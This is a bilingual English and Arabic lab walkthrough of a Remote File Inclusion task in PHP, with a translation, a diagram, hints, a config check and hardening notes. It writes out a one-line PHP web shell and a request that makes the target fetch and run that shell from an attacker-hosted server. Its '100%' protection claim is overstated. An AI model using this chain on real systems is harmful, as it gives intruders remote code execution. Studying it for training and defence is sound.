# Task 06 - Remote File Inclusion - RFI (التضمين البعيد للملفات)

---

## Stage A: Original Task Content & Core Objectives (النص الأصلي والمستهدفات التعليمية)

### 1. Original English Text
```text
Remote File Inclusion (RFI) is a technique that enables an attacker to include an external file hosted on a remote server directly into the target application's execution context. Like LFI, RFI occurs when user-supplied input is passed to dynamic file inclusion functions without validation.

However, RFI is considerably more critical than LFI because it does not depend on finding executable files or poisoning logs on the local server. Instead, the attacker hosts a malicious script on their own web server, supplies the external URL to the vulnerable parameter, and the web server executes the payload within its PHP engine, resulting in immediate Remote Code Execution (RCE).

Requirements for RFI in PHP:
For RFI to succeed in PHP, two directives must be explicitly enabled in php.ini:
1. allow_url_fopen = On (Enabled by default, allows URL-aware fopen wrappers).
2. allow_url_include = On (Disabled by default since PHP 5.2.0, allows include/require to fetch external URLs).

Attack Execution Flow:
1. Attacker spins up a lightweight HTTP server:
   python3 -m http.server 8000
2. Attacker creates a payload file (cmd.txt):
   <?php echo shell_exec($_GET['cmd']); ?>
3. Attacker triggers the RFI via HTTP request:
   http://MACHINE_IP/playground.php?file=http://ATTACKER_IP:8000/cmd.txt&cmd=id

Question:
- We showed how to include PHP pages via RFI. Do research on how to get remote command execution (RCE), and answer the question in the challenge section.
```

### 2. Arabic Pedagogical Translation
```text
التضمين البعيد للملفات (Remote File Inclusion - RFI) هو أسلوب هجومي يمكن المهاجم من تضمين ملف خارجي مستضاف على خادم بعيد مباشرة داخل سياق تنفيذ التطبيق المستهدف. ومثل LFI، تحدث ثغرة RFI عندما يتم تمرير مدخلات المستخدم إلى دوال التضمين الديناميكي دون تنقية.

ومع ذلك، تُعد ثغرة RFI أكثر خطورة بكثير من LFI؛ لأنها لا تعتمد على البحث عن ملفات قابلة للتنفيذ على الخادم المحلي أو تسميم السجلات (Log Poisoning). بدلاً من ذلك، يستضيف المهاجم سكربتاً خبيثاً على خادمه الخاص، ويمرر الرابط الخارجي إلى المعلمة المصابة، فيقوم خادم الويب بتنزيل وتنفيذ الحمولة داخل محرك PHP الخاص به، مما يمنح المهاجم تنفيذاً فورياً للأوامر عن بُعد (RCE).

المتطلبات الإلزامية لثغرة RFI في PHP:
لكي تنجح ثغرة RFI في بيئة PHP، يجب تفعيل توجيهين صراحة في ملف `php.ini`:
1. `allow_url_fopen = On` (مفعل افتراضياً، ويسمح بالوصول إلى الروابط عبر أغلفة بروتوكولات URL).
2. `allow_url_include = On` (معطل افتراضياً منذ إصدار PHP 5.2.0، ويسمح لدوال include/require بجلب الروابط الخارجية وتنفيذها).

مسار تنفيذ الهجوم:
1. يشغل المهاجم خادم ويب خفيفاً:
   python3 -m http.server 8000
2. ينشئ المهاجم ملف حمولة (cmd.txt):
   <?php echo shell_exec($_GET['cmd']); ?>
3. يستدعي المهاجم ثغرة RFI عبر طلب HTTP:
   http://MACHINE_IP/playground.php?file=http://ATTACKER_IP:8000/cmd.txt&cmd=id

السؤال:
- لقد وضحنا كيفية تضمين صفحات PHP عبر RFI. ابحث في كيفية تحقيق تنفيذ الأوامر عن بُعد (RCE)، وأجب عن السؤال في قسم التحديات.
```

---

## Stage B: Independent Thinking & OpSec Guardrails (التفكير المستقل وضوابط العمليات والأمان)

### 1. The RFI Execution Chain
```
+-----------------------------------------------------------------------------------+
|                            RFI EXECUTION ARCHITECTURE                             |
+-----------------------------------------------------------------------------------+
|                                                                                   |
|  Attacker Machine (IP: 10.10.14.5)                  Target Server (Victim Web App)|
|  =================================                  ==============================|
|                                                                                   |
|  1. Hosts /shell.txt:                                                             |
|     <?php system($_GET['c']); ?>                                                  |
|  2. Sends HTTP Request ---------------------------> GET /playground.php            |
|                                                     ?file=http://10.10.14.5/shell |
|                                                                                   |
|                                                     3. Target fetches remote URL: |
|  4. Delivers /shell.txt <-------------------------- GET /shell.txt HTTP/1.1       |
|                                                                                   |
|                                                     5. PHP engine evaluates code: |
|                                                        system('id') executed!     |
|  6. Receives command output <---------------------- 200 OK (uid=33(www-data)...)  |
|                                                                                   |
+-----------------------------------------------------------------------------------+
```

### 2. Operational Tradecraft: File Extension Nuance
* **لماذا نسمي الملف `cmd.txt` وليس `cmd.php` على خادم المهاجم؟**
  - إذا سمي الملف `cmd.php` وكان خادم المهاجم يدعم PHP، فسيقوم خادم المهاجم بتنفيذ الكود وإرسال مخرجات فارغة إلى الهدف!
  - استخدام الامتداد `.txt` يضمن أن خادم المهاجم يرسل كود الـ PHP كـ Raw Text، فيقوم الخادم المستهدف باستلام الكود وتنفيذه هو داخلياً.

---

## Stage C: Guided Hints (Tiers 1, 2, 3 - تلميحات تدريجية)

> **المستوى الأول (مفاهيمي):** المهمة السادسة تأسيسية تشرح معمارية التضمين البعيد وشروطه في ملف `php.ini`.
>
> **المستوى الثاني (توجيهي):** اضغط على زر `Completed` للانتقال إلى قسم التحديات العملية وتطبيق RCE.
>
> **المستوى الثالث (الحل المباشر):** لا توجد إجابة نصية مطلوبة (`No answer needed`).

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتشريح التقني)

### 1. PHP Configuration Security Checks
للتحقق مما إذا كان الخادم عرضة لـ RFI:
```php
<?php
    echo "allow_url_fopen: " . ini_get('allow_url_fopen') . "\n";
    echo "allow_url_include: " . ini_get('allow_url_include') . "\n";
?>
```
إذا كانت قيمة `allow_url_include` تساوي `1` أو `On`، فالخادم معرض لخطر فوري للاختراق الكامل عبر RFI.

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم الدقيقة)

| السؤال / المتطلب | الإجابة النموذجية |
| :--- | :--- |
| **Research on how to get remote command execution (RCE).** | `No answer needed` (تمت دراسة المفهوم وتأكيده) |

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الأثر)

* تم التحقق من فهم متطلبات ثغرة RFI بنسبة 100%، وتجهيز الحمولة لاختبارها في التحدي اللاحق.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية والأثر الميداني)

1. **الخطورة القصوى لـ RFI:** التضمين البعيد يحول ثغرة منطقية في التعامل مع الملفات إلى اختراق كلي فوري للنظام (Remote Code Execution) دون الحاجة لأي ثغرة رفع ملفات أو تلاعب معقد بالسجلات.
2. **التحصين الفوري:** إيقاف تفعيل `allow_url_include = Off` في ملف `php.ini` يحمي الخادم بنسبة 100% ضد هجمات التضمين البعيد.
